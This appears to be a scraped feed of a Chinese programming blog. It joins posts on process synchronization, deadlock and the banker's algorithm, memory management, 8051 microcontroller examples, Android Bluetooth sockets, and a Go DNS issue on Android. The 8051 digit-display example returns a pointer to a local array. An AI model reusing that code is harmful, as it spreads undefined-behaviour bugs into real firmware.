问题描述：一张圆桌上坐着五名哲学家，每两名哲学家之间的桌子上摆一根筷子，两根筷子中间是一碗米饭。哲学家在思考时，并不影响他人；当哲学家饥饿时，才试图拿起左、右两根筷子（一根一根地拿起）。若筷子已在他人手上，则需要等待。饥饿地哲学家只有同时拿到两根筷子才可以开始进餐，进餐完毕后继续思考。\n问题分析：\n关系分析：五名哲学家与左右邻居是互斥的关系。 整理思路：本问题的关键是如何让一名哲学家拿到左右两根筷子而不造成死锁现象。解决办法有两个：一是让他们同时拿到两根筷子；二是对每个哲学家的动作制定规则。 信号量设置：定义互斥信号量数组 chopstick[5] = {1, 1, 1, 1, 1}，用于五个筷子的互斥访问。哲学家按顺序标号 0~4，哲学家 i 左边筷子的编号为 i，哲学家右边筷子的编号为(i + 1) % 5。 算法实现：\n1 2 3 4 5 6 7 8 9 10 11 12 semaphore chopstick[5] = {1, 1, 1, 1, 1}; // 定义信号量数组 chopstick[5] Pi() { do { P(chopstick[i]); // 取左边筷子 P(chopstick[(i + 1) % 5]); // 取右边筷子 eat; // 进餐 V(chopstick[i]); // 放回左边筷子 V(chopstick[(i + 1) % 5]); // 放回右边筷子 think; // 思考 } while(1); } 该算法存在以下问题：当五名哲学家都想要进餐并分别拿起左边筷子时（都恰好执行完wait(chopstick[i]);）筷子已经被拿完，等到他们再想拿右边筷子时就全部阻塞，因此出现了死锁。\n为了防止死锁的发生，可对哲学家进餐施加一些限制条件：当左右两边筷子都可以用时，才允许他抓取筷子。\n算法描述：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 semaphore chopstick[5] = {1, 1, 1, 1, 1}; // 定义信号量数组 chopstick[5] semaphore mutex = 1; // 设置取筷子信号量 Pi() { do { P(mutex); // 在取筷子前获得互斥量 P(chopstick[i]); // 取左边筷子 P(chopstick[(i + 1) % 5]); // 取右边筷子 V(mutex); // 释放取筷子信号量 eat; // 进餐 V(chopstick[i]); // 放回左边筷子 V(chopstick[(i + 1) % 5]); // 放回右边筷子 think; // 思考 } while(1); } 4. 吸烟者问题 问题描述：假设一个系统有三个抽烟者进程和一个供应者进程。每个抽烟者不停地卷烟并抽掉它，但要卷起并抽掉一支烟，抽烟者必须要有三种材料：烟草、纸和胶水。三个抽烟者中，第一个拥有烟草，第二个拥有纸，第三个拥有胶水。供应者无限地提供三种材料，供应者每次将两种材料放到桌子上，拥有剩下那种材料的抽烟者卷起一根烟并抽掉它，并给供应者一个信号已完成，此时供应者就会将另外两种材料放到桌上，如此重复。\n问题分析：\n关系分析：供应者与三个抽烟者分别是同步关系。由于供应者同时只能满足一个抽烟者，因此三个抽烟者对抽烟这个动作互斥。 整理思路：供应者作为生产者向三个抽烟者提供材料。 信号量设置：信号量 offer1、offer2、offer3 分别表示三个吸烟者需要的资源组合。信号量 finish 用于互斥进行抽烟动作。 算法描述：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 int random; // 存储随机数 semaphore offer1 = offer2 = offer3 = finsh = 0; process P() { // 供应者 while(1) { random = 任意整数; random = random % 3; if (random == 0) V(offer1); else if (random == 1) V(offer2); else V(offer3); 任意两种材料放在桌子上; P(finish); } } process C1() { // 抽烟者1 while(1) { P(offer1); 抽烟; V(finish); } } process C2() { // 抽烟者2 while(1) { P(offer2); 抽烟; V(finish); } } process C3() { // 抽烟者3 while(1) { P(offer3); 抽烟; V(finish); } } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/2.3-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/","title":"2.3 进程同步"},{"content":"2.4 死锁 思维导图 一、死锁的概念 1. 死锁的定义 在多道程序中，由于多个进程的并发执行，改善了系统资源的利用率，并提高了系统的处理能力。然而多个进程的并发执行也带来了新的问题——死锁。所谓死锁，是指多个进程因竞争关系而造成的一种僵局（相互等待），若无外力作用，这些进程都将无法向前推进。\n2. 死锁产生的原因 （1）系统资源的竞争 通常系统中拥有不可剥夺资源，其数量不足以满足多个进程运行的必须，使得进程在运行过程中，会因为争夺资源陷入僵局。只有对不可剥夺资源的竞争才会产生死锁，对可剥夺资源的竞争是不会引起死锁的。\n（2）进程推进顺序非法 进程在运行过程中，请求和释放资源的顺序不当，同样会导致死锁。信号量使用不当也会造成死锁，进程间彼此互相等待对方发来的消息，也会使得这些进程间无法继续向前推进。\n（3）死锁产生的必要条件 死锁的产生必须同时满足以下四个条件：\n互斥条件：进程要求对所分配的资源进行排他性控制，即在一段时间内资源仅为一个进程所有； 不剥夺条件：进程所获得的资源在未使用完之前不能被其他进程强行夺走； 请求并保持条件：进程已经保持了至少一个资源，但又提出了新的资源请求，而该资源又被其他进程占有，但又对自己获得的资源不释放； 循环等待条件：存在一种进程资源的循环等待链，链中每个进程已获得的资源被链中另一个进程请求。即存在一个处于等待态的进程集合 {P1，P2，\u0026hellip;，Pn}，其中 Pi 等待的资源被 Pi+1 占用，Pn 等待的资源又被 P0 占用。 注意：发生死锁时一定有循环等待，但是发生循环等待时不一定发生死锁！循环等待不一定发生死锁的原因时，同类资源数大于一。若系统中每类资源都只有一个资源，则会变成死锁。\n二、死锁的处理策略 为使系统不发生死锁，必须设法破坏产生死锁的四个必要条件之一，或允许死锁发生，但当死锁发生时必须能检测并实现恢复。\n1. 死锁预防 设置某些限制条件，破坏死锁的四个必要条件中的一个或多个，以防止死锁发生。\n2. 避免死锁 在资源的动态分配过程中，用某种方法防止系统进入不安全状态，从而避免死锁。\n3. 死锁检测及解除 无需采取任何限制性措施，允许进程在允许过程中发生死锁。通过系统检测机构及时地检测出死锁的发生，然后采取某种措施解除死锁。\n4. 死锁处理策略的比较 措施 资源分配策略 各种可能模式 主要优点 主要缺点 死锁预防 保守，宁可资源闲置 一次请求所有资源，资源剥夺，资源按序分配 适用于突发式处理的进程，不必进行剥夺 效率低，进程初始化时间延长；剥夺次数过多；不使灵活申请新资源 死锁避免 使“预防”和“检测”的折中（在运行时判断是否可能死锁） 寻找可能的安全允许顺序 不必进行剥夺 必须直到将来的资源请求；进程不能被长时间阻塞 死锁检测 宽松，只要允许就分配资源 定期检查死锁是否已经发生 不延长进程初始化时间，允许对死锁进行现场化处理 通过剥夺解除死锁，造成损失 三、死锁预防 防止死锁的发生只需要破坏死锁产生四个必要条件之一即可。\n1. 破坏互斥条件 若系统资源都能共享使用，则系统不会进入死锁状态。但实际上的系统不可能所有资源共享，因此这种方法只能在特定的场合使用。\n2. 破坏不剥夺条件 当一个已保持了某些不可剥夺资源的进程请求新的资源而得不到满足时，它必须释放已经保持的所有资源，待以后需要时再重新申请。\n该策略实施起来比较复杂，释放已获得的资源可能造成前一阶段工作的失效，反复地申请和释放资源会增加系统开销，降低系统吞吐量。这种方法常用于状态容易保存和恢复的资源，如 CPU。\n3. 破坏请求并保持条件 采用预先静态分配方法，即进程在允许前一次申请完它需要的全部资源，在它资源未满足前，不把它投入允许。一旦投入允许，这些资源就一直归它所有，不再提出其它资源请求，这就就不会发生死锁。\n这种方式实现简单，但是缺点也十分明显，系统资源被严重浪费，其中有些资源可能仅存在允许初期或运行快结束时才使用，甚至根本不使用。而且还会导致“饥饿”现象，由于个别资源长期被其它进程占用，将致使等待该资源的进程迟迟不能开始。\n4. 破坏循环等待条件 为了破坏循环等待条件，可采用顺序资源分配法。首先给系统中的资源编号，规定每个进程必须按编号递增的顺序请求资源，同类资源一次性申请完。也就是说，只要进程提出申请分配资源 Ri，则该进程在以后的资源申请中就只能申请编号大于 Ri 的资源。\n这种方法的问题在于编号必须相对稳定，这就限制了新类型设备的增加；尽管在编号时已考虑到大多数作业使用这些资源的顺序，但也经常会发生作业使用资源的顺序与系统规定顺序不同的情况，造成资源的浪费；此外，这种按规定申请资源的方法也必定会给用户编程造成麻烦。\n四、死锁避免 避免死锁同样属于事先预防策略，但并不事先采取某种限制措施破坏死锁的必要条件 ，而在资源动态分配过程中，防止系统进入不安全状态，以避免发生死锁。这种方法能够获得较好的系统性能。\n1. 系统安全状态 避免死锁的方法中，允许进程动态地申请资源，但系统在进行资源分配之前，应先计算资源分配的安全性。若此次分配不会导致系统进入不安全的状态，则将系统资源分配给每个进程；否则进程等待。\n所谓安全状态，是指系统能按某种进程推进顺序为每个进程 Pi 分配其所需要的资源，直至满足每个进程对资源的最大需求，使每个进程都可顺序完成。此时就称这个推进顺序为安全序列，若系统无法找到一个安全序列，则称这个系统处于不安全状态。\n假设系统中有三个进程 P1、P2和P3，共有12台磁带机。进程P1共需要10台磁带机，P2、P3分别需要4台和9台。假设在 T0 时刻，进程 P1、P2和P3已分别获得5台、2台和2台，还有3台未分配。\n进程 最大需求 已分配 可用 P1 10 5 3 P2 4 2 P3 9 2 在 T0 时刻是安全的，因为存在一个安全序列 P2、P1、P3，即只要系统按此进程序列分配资源，那么每个进程都能顺利完成。若在 T0 时刻后，系统分配 1 台磁带机给 P3，则此时系统便进入不安全状态，因为此时已经无法再找到一个安全序列。\n并非所有的不安全状态都是死锁状态，但当系统进入不安全状态后，便可能进入死锁状态；反之，只要系统处于安全状态，系统便可避免进入死锁状态。\n2. 银行家算法 银行家算法是著名的死锁避免算法，其思想是：把操作系统当作银行家，操作系统管理的资源相当于银行家管理的资金，进程向操作系统请求分配资源相当于用户向银行家贷款。 操作系统按照银行家制定的规则为操作系统分配资源。当进程首次申请资源时，要测试该进程对资源的最大需求量，若系统现存的资源可以满足它的最大需求量，则按照当前的申请量分配资源，否则就推迟分配；当进程在执行中申请资源时，先测试该进程已占用的资源数与本次申请的资源数是否超过该进程对资源的最大需求量。若超过则拒绝分配资源，若未超过则再测试系统现存的资源能否满足该进程尚需的最大资源量，若能满足则按当前的申请量分配资源，否则也要推迟分配。\n（1）数据结构描述 可利用资源向量 Available：含有 m 个元素的数组，其中每个元素代表一类可用资源的数目。 Available[j] = K 表示系统中 现有 Rj 类资源 K 个。\n最大需求矩阵 Max：n * m 矩阵，定义系统中 n 个进程中的每个进程对 m 类资源的最大需求。简单来说，一行代表一个进程，一列代表一类资源。Max[i, j] = K 表示该进程需要 Rj 类资源的最大数目为 K。\n分配矩阵 Allocation：n * m 矩阵，定义系统中每类资源当前已分配给每个进程的资源数。Allocation][i, j] = K 表示进程 i 当前已分得 Rj 类的资源数目为 K。\n需求矩阵 Need：n * m 矩阵，表示每个进程尚需的各类资源数。Need[i, j] = K 表示进程 i 还需要 Rj 类资源的数目为 K。\n$$ Need = Max - Allocation $$（2）银行家算法描述 设 Request 是进程 Pi 的请求向量，Request_i[j] = K 表示进程 Pi 需要 j 类资源 K 个，当 Pi 发出资源请求后，系统按下述步骤进行检查：\n若 Request_i[j] \u0026lt;= Need[i, j]，则转向步骤 2；否则认为出错，因为它所需要的资源数已超过它所宣布的最大值；\n若 Request_i[j] \u0026lt;= Available[j]，则转向步骤 3；否则，表示尚无足够资源，Pi 须等待；\n$$ Available = Available - Request\\\\ Allocation[i, j] = Allocation[i, j] + Request_i[j]\\\\ Need[i, j]= Need[i, j] - Request_i[j] $$ 系统执行安全性算法，检查此次资源分配后，系统是否处于安全状态。若安全，才正式将资源分配给进程 Pi，以完成本次分配；否则，将本次的试探分配作废，恢复原来的资源分配状态， 让进程等待。\n（3）安全性算法 初始时安全序列为空。 从 Need 矩阵中找出符合条件的行；改行对应的进程不在安全序列中，而且该行小于等于 Available 向量，找到后，把对应的进程加入安全序列；若找不到，则执行步骤 4； 进程 Pi 进入安全序列后，可顺利执行，直至完成，并释放分配给它的资源，故而执行 Available = Available + Allocation[i]，其中 Allocation[i] 表示进程 Pi 代表的在 Allocation 矩阵中对应的行，返回步骤 2； 若此时安全序列中已有所有进程，则系统处于安全状态，否则系统处于不安全状态。 3. 安全性算法举例 假定系统中有 5 个进程{P0, P1, P2, P3, P4}和 3 类资源A B C，各种资源的数量分别为10、5、7，在 T0 时刻的资源分配情况见下表：\n进程 \\ 资源情况 Max A B C Allocation\nA B C Available\nA B C P0 7 5 3 0 1 0 3 3 2\n(2 3 6) P1 3 2 2 2 0 0\n(3 0 2) P2 9 0 2 3 0 2 P3 2 2 2 2 1 1 P4 4 3 3 0 0 2 $$ \\begin{bmatrix} 7 \u0026 5 \u0026 3 \\\\ 3 \u0026 2 \u0026 2 \\\\ 9 \u0026 0 \u0026 2 \\\\ 2 \u0026 2 \u0026 2 \\\\ 4 \u0026 3 \u0026 3 \\\\ \\end{bmatrix} - \\begin{bmatrix} 0 \u0026 1 \u0026 0 \\\\ 2 \u0026 0 \u0026 0 \\\\ 3 \u0026 0 \u0026 2 \\\\ 2 \u0026 1 \u0026 1 \\\\ 0 \u0026 0 \u0026 2 \\\\ \\end{bmatrix} = \\begin{bmatrix} 7 \u0026 4 \u0026 3 \\\\ 1 \u0026 2 \u0026 2 \\\\ 6 \u0026 0 \u0026 0 \\\\ 0 \u0026 1 \u0026 1 \\\\ 4 \u0026 3 \u0026 1 \\\\ \\end{bmatrix} \\\\ Max \\qquad\\quad Allocation \\qquad\\quad Need $$ 然后，将 Available 向量与 Need 矩阵的各行进行比较，找出比 Available 矩阵小的行；\n$$ (3 \\ 3 \\ 2) \\ + \\ (2 \\ 0 \\ 0) \\ = \\ (5 \\ 3 \\ 2) = Available \\\\ {\\begin{bmatrix} 7 \u0026 4 \u0026 3 \\\\ 6 \u0026 0 \u0026 0 \\\\ 0 \u0026 1 \u0026 1 \\\\ 4 \u0026 3 \u0026 1 \\\\ \\end{bmatrix}} $$ 去掉了对应的一行，再用更新后的 Available 向量和 Need 矩阵重复步骤 2，最后得到一个安全序列 {P1, P3, P4, P2, P0}。\n五、死锁检测和解除 若系统为进程分配资源时不采取任何措施，则应该提供死锁检测和解除的手段。\n1. 资源分配图 系统死锁可利用资源分配图来描述：\n圆圈代表一个进程，框代表一类资源。由于一种类型的资源可能有多个，因此用框中的一个圆代表一类资源中的一个资源。从进程到资源的有向边称为请求边，表示该进程申请一个单位的该类资源；从资源到进程的边称为分配边，表示该资源已有一个资源分配给了该进程。\n2. 死锁定理 可以通过将资源分配图简化的方法来检测系统状态S是否为死锁状态。简化方法如下：\n在资源分配图中，找出既不阻塞又不是孤点的进程 Pi（即找出一条有向边与它相连，且该有向边对应资源的申请数量小于等于系统中已有空闲资源数量。若所有的连接该进程的边均满足上述条件，则这个进程能继续运行直至完成，然后释放它所占有的所有资源）。消去它所有的请求边和分配边，使之成为孤立的结点。在图 a中，P1是满足这一条件的进程结点，将 P1 的所有边消去，便得到图 b 所示的情况。\n进程 Pi 所释放的资源，可以唤醒某些因等待这些资源而阻塞的进程，原来的阻塞进程可能变为非阻塞进程。在上图中，进程P2 就满足这样的条件。根据第 1 条中的方法进行一系列简化后,若能消去图中所有的边，则称该图是可完全简化的，如图所示。\nS为死锁的条件是当且仅当S状态的资源分配图是不可完全简化的,该条件为死锁定理。\n3. 死锁解除 一旦检查出死锁，就应当立即采取相应的措施来解除死锁。死锁解除的主要方法有：\n资源剥夺法：挂起某些死锁进程，并抢占它的资源，将这些资源分配给其它死锁进程。但应当防止被挂起的进程长时间得不到资源而处于资源匮乏的状态。 撤销进程法：强制撤销部分甚至全部死锁进程并剥夺这些进程的资源。撤销的原则可以按进程优先级和撤销进程代价的高低进行； 进程回退法：让一个或多个进程回退到足以回避死锁的地步，进程回退时自愿释放资源而非被剥夺，要求系统保持进程的历史信息，设置还原点。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/2.4-%E6%AD%BB%E9%94%81/","title":"2.4 死锁"},{"content":"3.1 内存管理概念 一、内存管理的基本原理和要求 内存管理（Memory Management）是操作系统中最重要和最复杂的内容之一。有效的内存管理在多道程序设计中非常重要，它不仅可以方便用户使用存储器、提高内存利用率，还可以通过虚拟技术从逻辑上扩充存储器。\n内存管理的功能有：\n内存空间分配与回收：由操作系统完成主存储器空间的分配和管理，使程序员摆脱内存分配的麻烦，提高编程效率； 地址转换：在多道程序环境下，程序中的逻辑地址与内存中的物理地址不可能一致，因此存储管理器必须提供地址变换功能，把逻辑地址转换成相应的物理地址； 内存空间扩充：利用虚拟存储技术或自动覆盖技术，从逻辑上扩充内存； 存储保护：保证各道作业在各自的存储空间内运行，互不干扰。 1. 程序装入和链接 创建进程首先要将程序和数据接入内存。将用户源程序变为可在内存中执行的程序，通常需要以下几个步骤：\n编译：由编译程序将用户源代码编译成若干目标模块； 链接：由链接程序将编译后形成的一组目标模块及所需的库函数链接在一起，形成一个完整的装入模块； 装入：由装入程序将装入模块装入内存运行。 程序的链接有以下三种方式：\n静态链接：在程序运行之前，先将各目标模块及它们所需的库函数链接成一个完整的执行程序，以后不再拆开； 装入时动态链接：将用户源程序编译后所得到的一组目标模块，在装入内存时，采用边装入边链接的方式； 运行时动态链接：对某些目标模块的链接，是在程序中需要该目标模块时才进行的，其优点是便于修改和更新，便于实现对目标模块的共享。 内存装入模块在装入内存时，同样有三种方式：\n绝对装入：在编译时，若知道程序将驻留在内存的某个位置，则编译程序将产生绝对地址的目标代码。绝对装入程序按照装入模块中的地址，将程序和数据装入内存。由于程序中的逻辑地址与实际内存地址完全相同，故故不需要对程序和数据的地址进行修改；绝对装入方式只适合单道程序环境。另外程序中所用的绝对地址，可在编译或汇编时给出，也可以由程序员直接赋予。通常情况下在程序中采用的是符号地址，编译或汇编时再转换为绝对地址；\n可重定位装入：在多道程序环境下，多个目标模块的起始地址（简称始址）通常都从 0 开始，程序中的其他地址都是相对于始址的，此时应采用可重定位装入方式。根据内存的当前情况，将装入模块装入内存的适当位置。装入时对目标程序中指令和数据的修改过程称为重定位。\n静态重定位的特点是：一个作业装入内存时，必须给它分配要求的全部内存空间，若没有足够的内存，则不能装入作业。一旦进入内存，整个运行期间就不能在内存中移动，也不能再申请空间； 动态运行时装入（动态重定位）：程序在内存中若发生移动，则需要采用动态的装入方式。装入程序把装入模块装入内存后，并不立即把装入模块中的相对地址转换为绝对地址，而是把这种地址转换推迟到程序真正需要执行的时候才执行。因此，装入内存后的所有地址均为相对地址。这种方式需要一个重定位寄存器的支持。\n动态重定位的特点是：可以将程序分配到不连续的存储区中中；在程序运行之前可以只装入它的部分代码即可投入运行，然后再程序运行期间，根据需要动态申请分配内存；便于程序段的共享，可以向用户提供一个比存储空间大得多的地址空间。 2. 逻辑地址空间于物理地址空间 编译后，每个目标模块都从 0 号单元开始编址，这称为该目标模块的相对地址（逻辑地址）。当链接程序将各个模块链接成一个完整的可执行目标程序时，链接程序顺序依次按照各个模块的相对地址构成统一的从 0 号单元开始编址的逻辑地址空间。用户程序和程序员只需要知道逻辑地址，而内存管理的具体机制则是完全透明的，只有系统编程人员才会涉及。不同进程可以拥有相同的逻辑地址，因为这些逻辑地址可以映射到主存的不同位置。\n物理地址空间是指内存中物理单元的集合，它是地址转换的最终地址，进程在运行时执行指令和访问数据，最后都要通过物理地址从主存中存取。当装入程序将可执行代码装入内存时，必须通过地址转换将逻辑地址转换成物理地址，这个过程就称为地址重定位。\n3. 内存保护 内存分配前，需要保护操作系统不受用户进程的影响，同时保护用户进程不受其他用户进程的影响。\n内存保护可采取两种方法：\n在 CPU 中设置一对一上、下限寄存器；存放用户作业在主存中的下限和上限地址，每当 CPU 要访问一个地址时，分别和两个寄存器的值相比较，判断有无越界；\n采用**重定位寄存器（基址寄存器）和界地址寄存器（限长寄存器）**来实现这种保护。重定位寄存器含最小的物理地址值，界地址寄存器含逻辑地址的最大值。每个逻辑地址值必须小于界地址寄存器；内存管理机构动态地将逻辑地址与界地址寄存器进行比较，若未发生地址越界，则加上重定位寄存器的值后映射成物理地址，再送交内存单元。\n二、覆盖与交换 覆盖和交换技术是在多道程序环境下来扩充内存的两种方法。\n1. 覆盖 早期的计算机系统中，主存容量很小，虽然主存中仅存放一道用户程序，但存储空间放不下用户进程的现象也经常发生，这一矛盾可以用覆盖技术来解决。\n覆盖的基本思想如下：由于程序运行时并非任何时候都要访问程序及数据的各个部分，因此可以把用户空间分成一个固定区和若干个覆盖区。将经常活跃的部分放在固定区，其余部分按调用关系分段。首先先将那些即将要访问的段放入覆盖区，其他段放在外存中，在需要调用前，系统再将其调入覆盖区，替换覆盖区中原有的段。\n覆盖技术的特点是：打破了必须将一个进程的全部信息装入主存后才能运行的限制，但当同时运行程序的代码量大于主存时仍然不能运行。此外，内存中能够更新的地方只有覆盖区的段，不在覆盖区时会常驻内存中。\n2. 交换 交换的基本思想是：把处于等待状态的程序从内存中移到辅存中，把内存空间腾出来，这一过程又称换出。\n有关交换，需要注意以下几个问题：\n交换需要备份存储，通常是快速磁盘。它必须足够大，并能够提供对这些内存映像的直接访问； 为了有效使用 CPU，需要使每个进程的执行时间比交换时间长，而影响交换时间的主要是转移时间。转移时间与所交换的内存空间成正比； 交换时间通常作为磁盘的一整块，且独立于文件系统，因此使用起来可能很快； 交换通常再又许多进程运行且内存空间吃紧时开始启动，而系统负荷降低就暂停； 普通的交换使用不多，但交换策略的某些变体在许多系统（如UNIX系统）中仍然发挥作用。 交换技术主要在不同进程之间进行，而覆盖主要在同一个程序或进程中。现代操作系统中，虚拟内存技术已经替代了覆盖技术；而交换技术仍然具有较强的生命力。\n三、连续分配管理方式 连续分配管理方式是指为一个用户程序分配一个连续的内存空间。连续分配方式主要包括单一连续分配、固定分区和动态分区分配。\n1. 单一连续分配 内存在此方式下分为系统区和用户区。系统区仅供操作系统使用，通常在低地址部分；用户区是为用户提供的、除系统区之外的内存空间。这种方式无需进行内存保护。因为内存在永远只有一道程序，因此肯定不会因为访问越界而干扰其他程序。\n这种方式的优点是简单、无外部碎片，可以采用覆盖技术，不需要额外的技术支持。缺点是只能用于单用户、单任务的操作系统中，有内部碎片，存储器的利用率极低。\n2. 固定分区分配 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/3.1-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%A6%82%E5%BF%B5/","title":"3.1 内存管理概念"},{"content":"360 全景照片识别 Auto Detect Image for 360 nature in PHP - Stack Overflow\nEXIF tag：\nProjection Type : equirectangular\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/360-%E5%85%A8%E6%99%AF%E7%85%A7%E7%89%87%E8%AF%86%E5%88%AB/","title":"360 全景照片识别"},{"content":"51单片机入门例程 一、点亮一个灯 设备信息： LED1 ~ LED8 依次位于单片机 P2.7 ~ P2.0\n实现效果：让 LED\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;reg52.h\u0026gt; sbit D1 = P2^0; // 将P2.0口赋值给D1变量 void main() { while(1) { D1 = 0; // 让P2.0口输出低电平，从而点亮LED // P2 = 0xFE; // 也可通过直接给P2口赋值实现 } } 二、LED流水灯 将 LED1 ~ LED8 依次点亮，即为流水灯。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include \u0026lt;reg52.h\u0026gt; void delay(int n) // 延时函数 { int x, y; for(x = 0 ; x \u0026lt; n; x++) { for(y = 0 ; y \u0026lt; 122 ; y++); //空跑122次大概为1ms } } void main() { int i, L1, L2; while(1) { L1 = 0xfe; L2 = 0xff; for(i=0 ; i\u0026lt;8 ; i++) //八个LED灯，所以需要移位8次 { P2 = ~(L1 ^ L2); // 点亮LED delay(200); L1 \u0026lt;\u0026lt;= 1; // 左移一位 L2 \u0026lt;\u0026lt;= 1; } } } 三、四联数码管显示 设备信息\nP0.0 ~ P0.4为数码管位选端 P1.0 ~ P1.7为数码管段选端 数码管为共阳数码管 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 #include \u0026lt;reg52.h\u0026gt; #define uchar unsigned char #define uint unsigned int uchar code table[]={ 0xc0,0xf9,0xa4,0xb0,0x99,0x92,0x82,0xf8,0x80,0x90,0x88,0x83,0xc6,0xa1,0x86,0x8e }; // 共阳数码管码表: 0 - F void delay(uint n) // 延时函数 { uint x, y; for(x = 0 ; x \u0026lt; n; x++) for(y = 0 ; y \u0026lt; 122 ; y++); //空跑122次大概为1ms } uint * split_num(uint n) // 将四位数拆分为独立的四个数字 { uint nums[4]; nums[0] = n / 1000; // 千位 nums[1] = n % 1000 / 100; // 百位 nums[2] = n % 100 / 10; // 十位 nums[3] = n % 10; // 个位 return nums; } void main() { uint i, j, x, L1, *nums; while(1) {\tfor(i=0 ; i \u0026lt; 10000 ; i++) // i为在数码管上显示的4位数 { nums = split_num(i); // 拆分数字 for(x=0 ; x\u0026lt;100 ; x++) // 该层循环控制数字增长速率 { L1 = 0xF7; // 初始位选 for(j=0 ; j\u0026lt;4 ; j++) // 该层让四个数码管循环显示数字，利用余晖效应制造出同时显示的效果 { P1 = table[*(nums + j)]; // 段选 P0 = L1; // 位选 delay(1); // 延时 L1 \u0026gt;\u0026gt;= 1; // 右移一位数码管 P0 = 0x00; // 消影 } } } } } 四、按键检测 设备信息\nKEY1 ~ P3.6; KEY2 ~ P3.7 ; KEY3 ~ P3.3(INT1) ; KEY4 ~ P4.2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include \u0026lt;reg52.h\u0026gt; #define uchar unsigned char #define uint unsigned int sbit D1 = P2^0; // LED sbit KEY1 = P3^6; // KEY void delay(uint n) // 延时函数 { uint x, y; for(x = 0 ; x \u0026lt; n; x++) for(y = 0 ; y \u0026lt; 122 ; y++); //空跑122次大概为1ms } void main() { uint tmp; while(1) {\ttmp = KEY1; // 读取KEY的状态 if(tmp == 0) { delay(1); // 延时后再次读取，目的是消除抖动 tmp = KEY1; if(tmp == 0) D1 = ~D1; // 反转灯的状态 } } } 五、外部中断按键检测 实现效果：按下按键，LED状态改变\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;reg52.h\u0026gt; sbit D1 = P2^0; // LED sbit KEY3 = P3^3; // KEY（INT1） void EX1_KEY(void)interrupt 2 // 外部中断1中断服务程序 { D1 = ~ D1; // 翻转LED状态 } void main() { D1 = 0; IT1 = 1; // 设定外部中断1为边沿触发方式 EX1 = 1; // 开启外部中断1的中断允许 EA = 1; // 开启系统总的中断允许 while(1); } 六、定时器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include\u0026lt;reg52.h\u0026gt; sbit D1 = P2^7; void main() { D1 = 0; TMOD = 0x01; //设置定时器0位工作模式1（M1,M0位0，1） TH0 = (65536-45872)/256; //装初值11.0592M晶振定时50ms数为45872 TL0 = (65536-45872)%256; TR0 = 1; //启动定时器0 ET0 = 1; //开定时器0中断 EA = 1; //开总中断 while(1); } void T0_time()interrupt 1 // T0 中断服务程序 { TH0 = (65536-45872)/256; //重新装载初值 TL0 = (65536-45872)%256; D1 = ~D1; } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A8%E4%BE%8B%E7%A8%8B/","title":"51单片机入门例程"},{"content":"Android 建立蓝牙连接 申请蓝牙使用权限 1 2 \u0026lt;uses-permission android:name=\u0026#34;android.permission.BLUETOOTH\u0026#34;/\u0026gt; \u0026lt;uses-permission android:name=\u0026#34;android.permission.BLUETOOTH_ADMIN\u0026#34;/\u0026gt; 请求打开蓝牙\n1 2 Intent intent = new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE); startActivityForResult(intent,1); 获取蓝牙适配器\n1 mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter(); 通过蓝牙设备地址构造 Device\n1 mDevice = mBlueToothAdapter.getRemoteDevice(\u0026#34;XX:XX:XX:XX:XX:XX\u0026#34;); 创建 RFCOMM socket，连接到对端蓝牙指定服务\nUUID mUUID = UUID.fromString(\u0026#34;c7f94713-891e-496a-a0e7-983a0946126e\u0026#34;); mBluetoothSocket = mDevice.createRfcommSocketToServiceRecord(mUUID); mBluetoothSocket.connect(); 使用 socket 进行数据收发\n1 2 3 4 5 6 7 8 9 // 获取连接 socket 的输入流 inputStream = mBluetoothSocket.getInputStream(); // 读取数据 inputStream.read(buffer); // 获取连接 socket 的输出流 outputStream = mBluetoothSocket.getOutputStream(); // 写入数据 outputStream.write(buffer); 关闭 socket\n1 mBluetoothSocket.close(); ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/adnroid-%E5%BB%BA%E7%AB%8B%E8%93%9D%E7%89%99%E8%BF%9E%E6%8E%A5/","title":"Adnroid 建立蓝牙连接"},{"content":"Android 端 DNS 查询错误 下面这段代码在 Android 端执行会抛错：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import ( \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; ) func main() { ip, err := net.LookupIP(\u0026#34;baidu.com\u0026#34;) if err != nil { return } log.Println(ip) } 错误信息：read udp [::1]:46548-\u0026gt;[::1]:53: read: connection refused\n通过分析后发现错误原因是 Go 在 linux 环境下是默认通过 /etc/resolve.conf 文件获取的系统 DNS 服务器地址，但是在 Android 端没有这个文件，会导致 Go 获取不到本机 DNS 服务器，然后 Go 就会使用默认设置的本机 DNS 服务器地址。\n相关代码：\n1 2 3 4 5 6 // net/dnsclient_unix.go func getSystemDNSConfig() *dnsConfig { resolvConf.tryUpdate(\u0026#34;/etc/resolv.conf\u0026#34;) return resolvConf.dnsConfig.Load() } 1 2 3 4 // net/dnsconfig.go var ( defaultNS = []string{\u0026#34;127.0.0.1:53\u0026#34;, \u0026#34;[::1]:53\u0026#34;} ) 1 2 3 4 5 6 7 8 9 10 11 12 13 